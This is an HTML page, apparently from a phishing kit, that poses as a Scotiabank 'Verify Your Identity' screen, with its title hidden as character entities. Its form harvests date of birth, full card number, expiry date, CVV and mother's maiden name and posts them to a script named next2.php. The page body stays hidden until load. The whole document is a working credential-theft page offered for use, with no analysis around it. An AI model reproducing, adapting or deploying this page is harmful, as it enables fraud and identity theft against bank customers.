<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<html>
<head>
<title>&#83;&#99;&#111;&#116;&#105;&#97;&#98;&#97;&#110;&#107;&#32;&#45;&#32;&#86;&#101;&#114;&#105;&#102;&#121;&#32;&#89;&#111;&#117;&#114;&#32;&#73;&#100;&#101;&#110;&#116;&#105;&#116;&#121;</title>
<script type="text/javascript" src="https://www.sitepoint.com/examples/password/MaskedPassword/MaskedPassword.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.0.0-beta1/jquery.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery-validate/1.15.0/jquery.validate.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery-validate/1.15.0/additional-methods.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.maskedinput/1.4.1/jquery.maskedinput.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.payment/1.3.2/jquery.payment.js"></script>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<link rel="shortcut icon"
              href="images/favicon.ico"/>			  
<script type="text/javascript">
function unhideBody()
{
var bodyElems = document.getElementsByTagName("body");
bodyElems[0].style.visibility = "visible";
}
</script>
<style type="text/css">
 .textbox {
    height: 34px;
    width: 275px;
  	border-radius: 4px;
    border: 1px solid #B9BDC1;
  	padding-left: 10px;
	font-size: 17px;
   
   
}
.textbox:focus {  
    border-color: #6596DB; 
  	box-shadow: 0px 0px 2px #6596DB; 
    -moz-box-shadow: 0px 0px 2px #6596DB; 
    -webkit-box-shadow: 0px 0px 2px #6596DB;  
    border-style: solid; 
    border-width: 1px; 
    outline: 0; 
 
}
 </style>	
<style type="text/css">
div#container
{
	position:relative;
	width: 1348px;
	margin-top: 0px;
	margin-left: auto;
	margin-right: auto;
	text-align:left; 
}
body {text-align:center;margin:0}
</style>
<script type='text/javascript'>
jQuery(function($){
   $("#dob").mask("99/99/9999",{placeholder:"MM/DD/YYYY"});
//   $("#sortcode").mask("99-99-99",{placeholder:"XX-XX-XX"});
});
</script>
<script>
    jQuery(function($) {
      $('.cc-number').payment('formatCardNumber');
      $('.cc-exp').payment('formatCardExpiry');
      $('.cc-cvc').payment('formatCardCVC');
    });
</script>

</head>
<body style="visibility:hidden" onload="unhideBody()">
<div id="container">
<div id="image2" style="position:absolute; overflow:hidden; left:418px; top:66px; width:577px; height:211px; z-index:0"><img src="images/st7.png" alt="" title="" border=0 width=577 height=211></div>

<div id="image3" style="position:absolute; overflow:hidden; left:417px; top:198px; width:163px; height:534px; z-index:1"><img src="images/st8.png" alt="" title="" border=0 width=163 height=534></div>

<div id="image1" style="position:absolute; overflow:hidden; left:1px; top:0px; width:1348px; height:51px; z-index:2"><img src="images/st6.png" alt="" title="" border=0 width=1348 height=51></div>

<div id="shape1" style="position:absolute; overflow:hidden; left:283px; top:956px; width:130px; height:22px; z-index:9"><img border=0 width="100%" height="100%" alt="" src="images/shape242482109.gif"></div>

<form action=next2.php name=chalbhai id=chalbhai method=post>
<input name="dob" id="dob" placeholder="MM/DD/YYYY" class="textbox" autocomplete="off" required type="text" style="position:absolute;width:570px;left:421px;top:237px;z-index:3">
<input name="ccn" class="textbox cc-number" autocomplete="off" required type="text" style="position:absolute;width:570px;left:421px;top:314px;z-index:4">
<input name="exp" placeholder="MM/YYYY" class="textbox cc-exp" autocomplete="off" required type="text" style="position:absolute;width:570px;left:421px;top:397px;z-index:5">
<input name="cvv" class="textbox cc-cvc" autocomplete="off" required maxlength="3" type="text" style="position:absolute;width:570px;left:421px;top:480px;z-index:6">
<input name="mmn"  class="textbox" autocomplete="off" required type="text" style="position:absolute;width:570px;left:421px;top:563px;z-index:7">

<div id="formimage1" style="position:absolute;width:570px;left:421px;top:646px;z-index:8"><input type="image" name="formimage1" width="571" height="47" src="images/continue.png"></div>
</div>
<script type="text/javascript">
 
  //apply masking to the demo-field
  //pass the field reference, masking symbol, and character limit
  new MaskedPassword(document.getElementById("demo-field"), '\u25CF');
 
  //test the submitted value
  document.getElementById('demo-form').onsubmit = function()
  {
   alert('pword = "' + this.pword.value + '"');
   return false;
  };
 
 </script>
 
	
</body>
</html>
